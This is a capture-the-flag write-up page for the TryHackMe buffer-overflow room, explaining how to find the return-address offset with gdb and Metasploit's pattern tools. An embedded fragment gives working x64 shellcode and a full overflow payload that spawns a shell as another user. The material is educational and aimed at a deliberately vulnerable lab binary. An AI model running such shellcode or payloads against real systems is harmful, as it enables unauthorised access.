class=\"language-shell\"\u003e\\x31\\xff\\x66\\xbf\\xea\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIt is now longer,  54 bytes in total, so we have to reduce the number of NOPs to keep the offset at 152.\u003c/p\u003e\n\u003cp\u003eOur final payload looks like this  :\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$(python -c \u0026quot;print '\\x90'*86+'\\x31\\xff\\x66\\xbf\\xea\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05' + 'A'*12 + '\\x98\\xe2\\xff\\xff\\xff\\x7f'\u0026quot;)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eRun it\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ ./buffer-overflow $(python -c \u0026quot;print '\\x90'*86+'\\x31\\xff\\x66\\xbf\\xea\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05' + 'A'*12 + '\\x98\\xe2\\xff\\xff\\xff\\x7f'\u0026quot;)\n\nHere's a program that echo's out your input\n��������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j\u0026lt;XH1�AAAAAAAAAAAA�����\n\nsh-4.2$ whoami\nuser2\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eYou're user2, \u003ccode\u003ecat secret.txt\u003c/code\u003e and enjoy.\u003c/p\u003e\n\u003cp\u003eTask 9 works exactly the same way with a different offset.\u003c/p\u003e\n\u003cp\u003eGood luck ! -l1ge.\u003c/p\u003e"
}
</script>

<link rel="preload" as="script" href="https://l1ge.github.io/bundle.js?v=1650722515">
<link rel="preconnect" href="https://www.google-analytics.com">
<link rel="preconnect" href="https://stats.g.doubleclick.net">
<link rel="preconnect" href="https://www.googleadservices.com">
<link rel="preload" as="script" href="https://www.googletagmanager.com/gtag/js?id=">
<script src="https://www.googletagmanager.com/gtag/js?id="></script>
<script>
  window.dataLayer=window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js',new Date());
  gtag('config','');
</script>

</head>
<body>
  <header id="nav" class="header">
  <div class="ax-l-i">
    <div class="ax-logo">
      <a class="block" href="https://l1ge.github.io/" title="l1ge&#39;s cabin"><?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
 "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
 width="3400.000000pt" height="873.000000pt" viewBox="0 0 3400.000000 873.000000"
 preserveAspectRatio="xMidYMid meet">
<metadata>
Created by potrace 1.16, written by Peter Selinger 2001-2019
</metadata>
<g transform="translate(0.000000,873.000000) scale(0.100000,-0.100000)"
fill="#000000" stroke="none">
<path d="M2475 6131 c-1419 -1418 -1811 -1815 -1813 -1837 -6 -51 9 -116 33
-140 12 -12 42 -28 66 -34 73 -20 108 -2 225 112 56 55 107 97 112 94 5 -3 12
-41 16 -85 8 -102 39 -223 72 -278 14 -24 47 -72 73 -107 l49 -64 -48 -57
c-88 -104 -131 -209 -146 -356 -14 -140 50 -327 149 -435 49 -54 49 -54 30
-77 -119 -154 -143 -200 -167 -319 -20 -96 -20 -135 -1 -235 18 -95 67 -197
135 -281 l51 -63 -48 -53 c-141 -154 -186 -386 -117 -598 22 -66 101 -184 162
-240 28 -26 84 -70 126 -97 64 -41 85 -50 143 -56 37 -4 1288 -7 2778 -6
l2710 1 55 38 c237 161 342 331 343 557 1 161 -45 287 -144 398 l-50 56 51 63
c138 171 180 376 118 577 -26 86 -36 104 -109 200 l-61 81 46 51 c199 222 202
562 6 794 l-49 57 55 72 c89 116 127 218 140 379 4 43 11 80 16 83 5 3 54 -38
109 -91 108 -105 152 -130 208 -120 82 15 121 66 121 158 l0 42 -1813 1813
c-996 996 -1814 1812 -1817 1812 -3 0 -819 -814 -1815 -1809z m2245 973 c231
-229 420 -420 420 -425 0 -5 -374 -9 -850 -9 -467 0 -850 4 -850 9 0 12 837
841 849 841 6 0 200 -187 431 -416z m1030 -1029 l305 -305 -1765 0 -1765 0
305 305 305 305 1155 0 1155 0 305 -305z m908 -908 c161 -161 290 -296 286
-300 -10 -9 -5298 -9 -5308 0 -4 4 125 139 286 300 l293 293 2075 0 2075 0
293 -293z m-4822 -643 c60 -28 127 -97 155 -157 29 -65 26 -179 -7 -245 -69
-139 -241 -207 -386 -152 -75 28 -122 71 -158 144 -26 53 -32 76 -32 133 1
115 40 193 130 255 91 63 196 70 298 22z m4498 27 c3 -5 -6 -36 -19 -70 -55
-134 -50 -345 10 -485 9 -21 13 -41 10 -45 -8 -8 -4081 -8 -4089 0 -4 3 6 37
20 75 48 124 45 350 -7 471 -10 24 -17 49 -13 54 7 12 4081 12 4088 0z m676
-32 c96 -51 150 -134 158 -240 9 -131 -60 -253 -173 -305 -114 -54 -265 -19
-352 80 -103 117 -96 300 15 411 98 98 231 119 352 54z m-5173 -904 c49 -21
116 -89 147 -149 25 -50 28 -64 24 -133 -6 -125 -61 -213 -167 -265 -65 -32
-185 -32 -256 0 -60 28 -119 82 -148 137 -28 54 -35 177 -14 239 30 88 119
169 206 187 47 10 168 0 208 -16z m1388 -275 l0 -295 -490 0 c-430 0 -490 2
-488 15 1 8 11 42 24 75 43 116 37 328 -12 442 -10 24 -17 49 -13 54 3 5 204
8 492 7 l487 -3 0 -295z m1825 -910 l0 -1210 -760 0 -760 0 0 1210 0 1210 760
0 760 0 0 -1210z m1284 1201 c3 -5 -5 -36 -19 -69 -50 -123 -50 -321 0 -444
14 -34 21 -66 17 -70 -5 -5 -226 -7 -493 -6 l-484 3 -3 285 c-1 157 0 290 3
297 3 10 108 13 489 13 267 0 487 -4 490 -9z m681 -26 c62 -30 121 -93 135
-144 5 -20 10 -81 10 -137 0 -95 -2 -103 -29 -141 -74 -102 -172 -150 -283
-140 -117 10 -228 93 -262 194 -24 71 -21 168 8 228 29 59 48 82 98 120 61 44
104 56 191 51 58 -3 92 -11 132 -31z m-3790 -1175 l0 -305 -360 -3 c-198 -2
-420 0 -493 3 -118 6 -133 9 -127 24 48 115 50 123 50 281 0 145 -2 159 -28
224 -15 37 -27 70 -27 72 0 8 151 10 555 10 l430 -1 0 -305z m3110 299 c3 -4
-6 -35 -22 -70 -27 -62 -28 -70 -28 -229 0 -158 1 -168 28 -229 15 -35 24 -67
21 -70 -3 -3 -225 -6 -492 -6 l-487 0 -3 295 c-1 162 0 301 3 308 4 12 88 13
489 10 266 -1 487 -6 491 -9z m671 -29 c63 -31 103 -71 140 -140 15 -27 19
-56 19 -130 0 -112 -16 -151 -90 -219 -64 -59 -98 -71 -204 -71 -81 0 -95 3
-153 33 -98 51 -148 137 -148 258 0 139 83 250 223 295 61 20 139 11 213 -26z
m-5190 13 c67 -23 154 -110 177 -177 21 -62 22 -149 1 -209 -21 -61 -91 -139
-151 -167 -68 -33 -188 -33 -258 -2 -65 30 -121 85 -151 147 -32 67 -34 185
-4 248 40 85 104 141 190 168 45 13 145 9 196 -8z m1412 -1195 l2 -298 -488 0
c-269 0 -491 3 -494 6 -4 3 5 38 19 77 48 133 40 384 -13 465 -9 13 -13 27 -9
30 11 11 279 19 640 18 l340 -1 3 -297z m2880 295 c116 -3 216 -9 221 -13 7
-4 3 -20 -9 -46 -23 -46 -50 -175 -50 -239 0 -55 23 -164 49 -231 11 -29 17
-54 14 -58 -4 -3 -226 -6 -495 -6 l-488 0 0 293 c0 162 3 297 7 300 8 9 477 9
751 0z m897 -23 c52 -22 113 -83 136 -134 24 -52 27 -232 5 -274 -23 -43 -97
-109 -149 -132 -86 -38 -196 -36 -279 7 -44 22 -98 82 -124 137 -32 69 -34
188 -3 247 25 50 93 126 131 145 68 35 207 37 283 4z m-5180 9 c54 -15 147
-111 169 -175 36 -107 10 -235 -64 -312 -48 -49 -76 -65 -149 -82 -108 -26
-219 9 -300 95 -61 64 -76 111 -68 215 7 93 24 134 76 188 64 66 102 81 206
82 50 0 108 -5 130 -11z"/>
<path d="M10566 5239 c-211 -15 -512 -60 -654 -98 l-42 -12 0 -114 c0 -63 3
-115 8 -115 4 -1 70 -11 146 -24 158 -26 180 -39 191 -118 3 -24 5 -605 3
-1293 -3 -1332 -1 -1273 -49 -1303 -10 -7 -65 -19 -121 -27 -57 -8 -118 -17
-135 -20 l-33 -6 0 -119 0 -120 625 0 625 0 0 119 0 119 -27 6 c-16 3 -66 10
-113 16 -111 15 -142 25 -171 56 l-24 26 -3 1481 -2 1481 -37 38 c-21 22 -46
37 -58 37 -11 -1 -69 -5 -129 -10z"/>
<path d="M26940 5243 c-262 -18 -614 -70 -742 -109 -16 -5 -18 -19 -18 -119
l0 -113 63 -10 c34 -6 98 -16 141 -23 62 -10 86 -18 110 -40 l31 -27 3 -1416
2 -1415 84 -26 c248 -76 464 -109 716 -109 328 0 547 58 746 199 86 61 211
198 268 294 124 207 186 494 172 796 -15 337 -92 552 -255 712 -197 195 -494
269 -784 194 -97 -25 -236 -97 -304 -156 -28 -25 -54 -45 -57 -45 -3 0 -6 302
-6 671 l0 671 -42 39 c-24 21 -52 38 -63 37 -11 -1 -40 -3 -65 -5z m698 -1579
c176 -90 246 -259 259 -624 15 -452 -66 -749 -242 -882 -115 -87 -298 -108
-462 -53 l-83 28 0 737 0 738 70 36 c94 50 173 66 289 62 85 -3 100 -7 169
-42z"/>
<path d="M17940 5053 c0 -53 79 -1417 86 -1480 l5 -53 170 0 c93 0 169 1 170
3 0 1 22 354 48 785 l46 782 -262 0 -263 0 0 -37z"/>
<path d="M29286 4934 c-96 -30 -166 -97 -196 -187 -6 -21 -12 -72 -12 -114 1
-64 5 -85 31 -138 33 -67 71 -103 149 -138 38 -18 66 -22 152 -22 92 0 112 3
160 26 68 32 115 79 146 144 19 40 24 66 24 136 0 76 -3 93 -31 149 -35 69
-86 113 -167 142 -59 21 -189 22 -256 2z"/>
<path d="M12215 4500 c-11 -18 -198 -136 -305 -193 -123 -65 -326 -149 -422
-174 -79 -20 -75 -9 -52 -159 l17 -104 48 0 c54 0 299 33 397 54 l62 13 0
-849 0 -848 -28 -31 c-27 -30 -31 -31 -267 -67 l-240 -37 -3 -118 -3 -117 786
0 785 0 0 118 0 118 -172 28 c-214 34 -240 41 -264 67 -18 20 -19 57 -24 1142
l-5 1121 -130 23 c-149 25 -172 27 -180 13z"/>
<path d="M15212 4059 c-80 -10 -172 -61 -245 -134 l-63 -63 -39 30 c-129 97
-328 155 -565 165 -192 8 -374 -15 -522 -66 -189 -65 -361 -205 -431 -351 -57
-117 -71 -185 -72 -345 0 -158 10 -212 61 -324 61 -134 148 -222 283 -291 l44
-22 -43 -21 c-58 -29 -141 -106 -179 -166 -46 -72 -68 -184 -52 -274 6 -37 22
-89 35 -115 26 -52 94 -120 147 -147 l32 -17 -71 -33 c-193 -90 -297 -214
-324 -386 -38 -252 118 -487 390 -586 137 -50 232 -64 468 -70 142 -4 258 -1
325 6 349 40 614 152 794 336 132 134 186 260 193 450 5 144 -6 209 -54 304
-80 159 -264 261 -527 290 -53 6 -237 11 -409 11 -406 1 -488 14 -551 90 -48
57 -48 154 1 229 26 41 28 42 69 36 201 -30 455 -21 620 20 54 14 141 46 193
71 177 87 314 256 367 454 24 89 24 319 0 406 -9 34 -17 67 -17 73 0 8 59 11
195 11 l195 0 0 200 0 199 -42 12 c-67 18 -148 25 -206 18z m-878 -259 c102
-39 171 -141 196 -292 15 -92 12 -304 -5 -392 -18 -96 -43 -153 -91 -205 -64
-72 -102 -86 -229 -86 -105 0 -113 2 -165 31 -108 61 -162 169 -182 366 -14
129 0 289 32 385 34 97 112 174 210 204 52 16 177 10 234 -11z m205 -1961
c167 -21 230 -74 252 -211 13 -79 -3 -192 -37 -264 -75 -159 -270 -254 -521
-254 -178 0 -293 39 -372 125 -85 92 -121 222 -101 368 12 84 44 176 78 224
l20 28 298 -2 c165 -2 337 -8 383 -14z"/>
<path d="M22814 4046 c-427 -70 -727 -349 -830 -771 -35 -146 -48 -332 -34
-494 35 -415 208 -709 504 -855 149 -74 234 -91 471 -91 174 0 212 3 288 23
241 60 437 209 510 385 l15 35 -63 51 -64 51 -82 -55 c-333 -223 -723 -161
-864 137 -74 156 -100 328 -92 617 9 356 71 539 221 652 60 46 121 64 206 63
100 -2 220 -58 252 -118 7 -12 39 -120 73 -241 l61 -220 142 -3 c140 -3 142
-2 147 20 25 114 52 548 39 627 l-9 54 -68 29 c-78 33 -218 72 -339 94 -116
21 -383 27 -484 10z"/>
<path d="M16472 4034 c-516 -94 -793 -486 -792 -1121 1 -237 39 -423 125 -599
164 -338 423 -484 855 -484 403 0 698 144 828 405 50 102 51 97 -23 150 l-65
46 -63 -55 c-188 -168 -495 -230 -720 -146 -219 82 -321 288 -343 687 l-7 123
624 2 623 3 10 40 c5 22 10 119 10 215 1 197 -10 255 -69 375 -96 196 -270
318 -510 360 -108 19 -380 18 -483 -1z m320 -249 c129 -45 208 -202 208 -417
l0 -98 -360 0 -360 0 6 58 c10 86 49 233 77 288 45 89 132 161 224 184 50 12
146 5 205 -15z"/>
<path d="M19500 4035 c-352 -60 -562 -250 -599 -541 -10 -84 0 -208 24 -279
37 -110 125 -207 280 -310 94 -62 146 -89 448 -234 125 -61 245 -124 267 -141
121 -95 121 -299 0 -403 -61 -52 -126 -71 -240 -71 -111 0 -203 24 -290 76
-69 42 -88 76 -135 242 -20 72 -41 146 -46 164 l-11 32 -147 0 -148 0 -7 -42
c-11 -77 -19 -371 -12 -460 l8 -87 76 -30 c95 -36 268 -84 387 -108 131 -26
505 -26 625 1 189 41 336 112 441 213 114 109 162 230 162 408 1 166 -43 292
-133 385 -90 92 -340 236 -615 355 -327 141 -394 202 -395 361 0 55 5 81 25
121 70 140 280 180 484 93 83 -36 101 -64 156 -253 l48 -167 138 0 137 0 13
88 c7 49 13 175 14 287 l0 199 -75 23 c-98 31 -220 58 -351 77 -129 19 -420
20 -529 1z"/>
<path d="M24757 4035 c-210 -36 -362 -109 -488 -235 -67 -66 -95 -102 -124
-163 -22 -45 -35 -81 -29 -86 5 -4 35 -31 66 -60 l57 -53 68 53 c84 64 202
122 308 150 109 29 313 32 400 6 128 -39 203 -113 236 -234 26 -92 39 -410 18
-417 -8 -3 -121 -12 -252 -21 -311 -21 -436 -43 -585 -103 -191 -78 -323 -216
-368 -385 -18 -69 -18 -208 1 -282 44 -167 189 -297 395 -352 105 -28 327 -23
451 10 143 37 256 99 347 187 24 23 45 40 46 39 2 -2 16 -28 31 -57 103 -191
349 -240 720 -144 l70 18 3 111 3 111 -28 6 c-15 3 -66 10 -113 16 -46 7 -92
16 -102 21 -47 25 -46 18 -51 654 -4 570 -5 605 -25 690 -50 210 -163 365
-325 445 -140 68 -211 82 -447 86 -141 2 -229 -1 -283 -11z m523 -1509 l0
-235 -27 -19 c-129 -90 -325 -133 -449 -97 -114 33 -160 114 -152 267 7 137
68 224 188 269 56 22 244 46 373 48 l67 1 0 -234z"/>
<path d="M29445 4044 c-16 -2 -79 -9 -140 -15 -121 -12 -295 -40 -404 -64
l-71 -17 0 -122 0 -123 132 -22 c73 -12 143 -28 155 -36 12 -8 27 -32 32 -52
7 -25 11 -270 11 -696 0 -699 -1 -711 -47 -736 -11 -5 -62 -17 -114 -26 -52
-8 -106 -18 -121 -21 l-28 -6 0 -119 0 -119 595 0 595 0 0 120 c0 116 -1 120
-22 125 -13 2 -66 12 -118 20 -104 18 -136 33 -150 71 -6 15 -10 367 -10 898
l0 872 -38 37 -38 37 -94 -1 c-52 -1 -108 -4 -125 -5z"/>
<path d="M30800 4039 c-133 -14 -285 -38 -402 -66 l-108 -25 0 -122 0 -123
132 -22 c73 -12 143 -28 155 -36 12 -8 27 -32 32 -52 7 -25 11 -270 11 -696 0
-699 -1 -711 -47 -736 -11 -5 -62 -17 -114 -26 -52 -8 -106 -18 -121 -21 l-28
-6 0 -119 0 -119 565 0 565 0 0 120 0 119 -38 10 c-21 6 -54 14 -73 17 -49 10
-105 43 -118 71 -8 17 -11 228 -11 698 l0 674 73 36 c113 55 219 78 346 73 95
-3 112 -7 161 -33 101 -55 150 -155 171 -344 6 -57 9 -303 7 -599 l-3 -504
-31 -28 c-18 -16 -54 -32 -85 -40 -30 -6 -71 -16 -91 -21 l-38 -10 0 -119 0
-120 565 0 565 0 0 119 0 119 -27 6 c-16 3 -71 13 -123 22 -76 14 -100 22
-121 44 l-27 27 -5 609 c-5 657 -7 687 -63 855 -26 82 -78 176 -122 223 -48
51 -139 103 -224 127 -72 20 -104 23 -248 23 -146 -1 -177 -4 -265 -27 -159
-43 -272 -102 -383 -202 -29 -26 -54 -46 -56 -44 -2 2 -11 49 -20 104 -16 95
-19 102 -56 138 l-39 37 -88 -1 c-48 -1 -126 -6 -173 -10z"/>
</g>
</svg></a>
    </div>
    <div class="ax-user">
      <a class="p-2 w-7 h-7 block text-raven-500 hover:text-gray-800 focus:text-gray-800 focus:outline-none" target="_blank" rel="noopener nofollow" href="https://www.google.com/search?q=site:l1ge.github.io">
        <svg class="fill-current" viewBox="0 0 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M2.67 12.804c0-5.6 4.544-10.134 10.133-10.134s10.134 4.544 10.134 10.134-4.544 10.133-10.134 10.133S2.67 18.393 2.67 12.804zm28.943 16.923l-8.868-8.868c4.287-5.3 3.68-13.012-1.378-17.57S8.564-1.066 3.75 3.75s-5.017 12.558-.46 17.618 12.28 5.665 17.57 1.378l8.868 8.868a1.33 1.33 0 0 0 2.231-.597c.123-.46-.008-.952-.345-1.29h0z"/></svg>

      </a>
      <a class="p-2 block text-sm leading-none text-raven-500 hover:text-gray-800 focus:text-gray-800 focus:outline-none" href="https://l1ge.github.io/posts/">
        Posts
      </a>
      <a class="p-2 block text-sm leading-none text-raven-500 hover:text-gray-800 focus:text-gray-800 focus:outline-none" href="https://l1ge.github.io/contact/">
        Contact
      </a>
    </div>
  </div>

  
</header>

  <main>
<div class="default-single">
  <div class="ax-header ax-l-o">
    <div class="ax-l-i">
      <h1 class="post-title font-content-title font-normal leading-tight tracking-default text-40">TryHackMe - Buffer Overflows (Bof1)  Task 8  - Write-up</h1>
      <p class="post-subtitle font-content-sans font-light text-xl text-raven-500 mt-3">The room that makes you feel you're in the buffer.</p>

      <div class="ax-meta flex items-center mt-5">
        <div class="flex-grow min-w-0">
          <div class="flex items-center">
  <div class="flex-shrink-0">
    <img
    class="w-12 h-12 sm:w-14 sm:h-14 object-cover p-05 rounded-full border border-blue-300"
    src="https://l1ge.github.io/image/author/default.webp"
    alt="l1ge">
  </div>
  <div class="flex-shrink-0 ml-2 leading-tight font-content-sans">
    <a class="block text-sm text-raven-800 hover:text-raven-900 hover:underline focus:underline" target="_blank" rel="noopener nofollow" title="l1ge" href="https://l1ge.github.io">l1ge</a>
    <time class="text-sm text-raven-500" datetime="2020-05-19T13:00:00Z">May 19, 2020 3:00PM</time>
  </div>
</div>

        </div>
        <div>
          <div class="flex items-center">
  <a class="flex-shrink-0 block text-raven-800 hover:text-raven-900" target="_blank" rel="noopener nofollow" title="Share on Twitter" href="https://twitter.com/intent/tweet?text=TryHackMe%20-%20Buffer%20Overflows%20%28Bof1%29%20%20Task%208%20%20-%20Write-up%20by%20%40the_l1ge%20https%3a%2f%2fl1ge.github.io%2ftryhackme_bof1%2f"><svg class="w-6 h-6 fill-current" viewBox="0 0 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M32 6.078c-1.2.522-2.458.868-3.78 1.036 1.36-.812 2.398-2.088 2.886-3.626a13.11 13.11 0 0 1-4.16 1.588C25.742 3.794 24.026 3 22.154 3a6.56 6.56 0 0 0-6.556 6.562c0 .52.044 1.02.152 1.496-5.454-.266-10.28-2.88-13.522-6.862-.566.982-.898 2.106-.898 3.316a6.57 6.57 0 0 0 2.914 5.452 6.48 6.48 0 0 1-2.964-.808v.072c0 3.188 2.274 5.836 5.256 6.446-.534.146-1.116.216-1.72.216-.42 0-.844-.024-1.242-.112.85 2.598 3.262 4.508 6.13 4.57a13.18 13.18 0 0 1-8.134 2.798c-.538 0-1.054-.024-1.57-.1C2.906 27.93 6.35 29 10.064 29c12.072 0 18.672-10 18.672-18.668 0-.3-.01-.57-.024-.848C30.014 8.56 31.108 7.406 32 6.078z"/></svg>
</a>
</div>

        </div>
      </div>
    </div>
  </div>
  <div class="ax-feature ax-l-o">
    <div class="ax-l-i">


<figure>
<img
class="mb-2 mx-auto leading-none "
src="https://l1ge.github.io/image/lettherightonein2.jpg"
alt="TryHackMe - Buffer Overflows (Bof1)  Task 8  - Write-up">
<figcaption class="text-sm text-left text-raven-500">
<p>Let the right one in, 2008. Directed by Thomas Alfredson</p>
</figcaption>
</figure>

    </div>
  </div><div class="ax-content ax-l-o">
    <div class="ax-l-i">
      <article class="cdata">
<h1>0x0 About the room</h1>
<blockquote>
<p>Access: <a href="https://tryhackme.com/room/bof1">https://tryhackme.com/room/bof1</a></p>
</blockquote>
<p>Many people have been complaining about the difficulty of this room (rated as easy...) and the opacity of the instructions. I did too. It's supposed to be for beginners but the author assume you know how to use a disassembler and the shell code he gives you doesn't work so you eventually have to code your own.</p>
<p>Anyway, when I realized all that, I had already spent too much time to give up. It took me a few days to get the flags but I learned a lot.</p>
<p>Special thanks to rennox and tkiela who kept me on the surface when I was getting overflowed.</p>
<p><em>Disclaimer: I am a beginner,  this was my first buffer overflow and the first time I had to use gdb...Contact me if anything I say is incorrect.</em></p>
<h1>0x1 Finding the offset</h1>
<p>As explained in the instruction, the first step is to find the amount of bytes you need to fill in order to overwrite the return address.</p>
<h2>Method 1: The manual way</h2>
<p>Because we have access to she source code, we know the allocated memory for the buffer is at least 140 bytes. But between the 140th byte and the return address there is a gap filled with some &quot;<a href="http://www.songho.ca/misc/alignment/dataalign.html">alignment bytes</a>&quot; and by the rbp register (aka saved register) , which is 8 bytes in x64 architecture.</p>
<p>The offset will look like this : buffer(140 bytes) + Alignment bytes (?) + rbp (8 bytes).</p>
<p>So we know the offset will be at least 148 bytes long. To get the exact offset, we will fill the buffer with the letter 'A'  (\x41 in hex) until we start to see our 'As' overwriting the return address. I'll use gdb which I found easier to use than r2 for beginners.</p>
<p>Open gdb on your binary <code>$ gdb buffer-overflow</code></p>
<p>Let's start with 148  'A'.</p>
<pre><code class="language-bash">(gdb) run $(python -c &quot;print('A'*148)&quot;)

Starting program: $(python -c &quot;print('A'*148)&quot;)
Missing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_64
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400595 in main ()
</code></pre>
<p>The last line contain the return address <code>0x0000000000400595</code>. As we can see, there are no '41' so we didn't override it. Let's increase to 155</p>
<pre><code class="language-bash">(gdb) run $(python -c &quot;print('A'*155)&quot;)
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000414141 in ?? ()
</code></pre>
<p>We start to see that we're overwriting the return address.  I kept increasing and went too far after 159.</p>
<p>158 is  the right amount, which override perfectly the return address with 6 bytes.</p>
<pre><code class="language-bash">(gdb) run $(python -c &quot;print('\x41'*158)&quot;)
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()
</code></pre>
<p>So we know that with 158 bytes we override the 6-bytes-long return address. It means our offset to reach the start of the return address is 158-6 = <strong>152</strong></p>
<h2>Method 2 : With Metasploit's tool</h2>
<p>We create a pattern of a random length with the tool <code>pattern_create.rb</code> from  Metasploit's framework. Let's try a 200 bytes pattern.</p>
<pre><code class="language-bash">┌─[✗]─[l1ge@parrot]─[~]
└──╼$/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
</code></pre>
<p>We copy that pattern and run the binary in gdb with it</p>
<pre><code class="language-bash">(gdb) run 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'

Here's a program that echo's out your input
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400563 in copy_arg ()
</code></pre>
<p>Despite the overflow, the return address doesn't show our pattern. We have to search it somewhere else, in the rbp register instead (remember? the rbp comes just before the return address)</p>
<p>We do that with the command <code>i r</code> to show all the registers</p>
<pre><code class="language-bash">(gdb) i r
rax            0xc9	201
rbx            0x0	0
rcx            0x7ffff7b08894	140737348929684
rdx            0x7ffff7dd48c0	140737351862464
rsi            0x602260	6300256
rdi            0x0	0
rbp            0x6641396541386541	0x6641396541386541  &lt;-------HERE IS THE PATTERN
rsp            0x7fffffffe2b8	0x7fffffffe2b8
r8             0x7ffff7fef4c0	140737354069184
r9             0x77	119
r10            0x5e	94
r11            0x246	582
r12            0x400450	4195408
r13            0x7fffffffe3b0	140737488348080
r14            0x0	0
r15            0x0	0
rip            0x400563	0x400563 &lt;copy_arg+60&gt;
eflags         0x10206	[ PF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
</code></pre>
<p>We see that the rbp has been overridden with the pattern. We then use metasploit's  <code>pattern-offset.rb</code> to query the pattern we found in the rbp</p>
<pre><code class="language-bash">┌─[✗]─[l1ge@parrot]─[~]
└──╼$/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 6641396541386541
[*] Exact match at offset 144
</code></pre>
<p>It says that our rbp starts with an offset of 144. We know the rbp is 8 bytes so 144+8 = <strong>152</strong>. The offset we manually found is confirmed.</p>
<h1>0x2 Picking a shell code</h1>
<p>We need a shell code that we will put in our buffer and have the return address points to it. For now I just want a simple shell code, just to drop a shell.</p>
<p>There are a few on exploit-db like <a href="https://www.exploit-db.com/exploits/41750">this one</a> or <a href="https://www.exploit-db.com/exploits/42179">that one</a>. But I wont make you waste your time like I wasted mine. I've tried most of these simple shell codes and most of them didn't work on our case.  I was getting SIGILL errors all the time.</p>
<p>I later found out why: These short shell codes don't have an exit function call at their end, it means that once I injected these shell codes in the buffer and mess up the memory, the binary was still trying to execute these messed up instructions and thus, was reporting &quot;illegal instruction error&quot;.</p>
